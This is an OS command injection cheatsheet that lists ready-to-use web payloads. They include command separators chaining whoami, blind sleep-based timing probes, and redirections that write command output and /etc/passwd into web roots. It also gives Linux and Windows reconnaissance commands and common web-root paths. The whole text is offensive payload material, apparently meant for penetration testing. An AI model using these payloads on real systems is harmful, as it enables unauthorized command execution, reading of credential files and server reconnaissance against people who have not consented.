# OS Command Injection Cheatsheet

## Basic payloads
```
; whoami
| whoami
&& whoami
|| whoami
& whoami &
```

## Blind time delay
```
; sleep 10
& sleep 10 &
| sleep 10
&& sleep 10
```

## Output redirection
```
& whoami > /var/www/html/out.txt &
& id > /var/www/html/out.txt &
& cat /etc/passwd > /var/www/html/out.txt &
& ls -la > /var/www/html/out.txt &
```


## Useful commands

### Linux
```
whoami          → current user
id              → user and group info
hostname        → server hostname
cat /etc/passwd → all users
ls -la          → list files
pwd             → current directory
env             → environment variables
uname -a        → system info
```

### Windows
```
whoami          → current user
hostname        → server hostname
ipconfig        → network info
dir             → list files
set             → environment variables
systeminfo      → system info
```


## Common web roots
```
Linux:
/var/www/html/
/var/www/static/
/usr/share/nginx/html/

Windows:
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
```
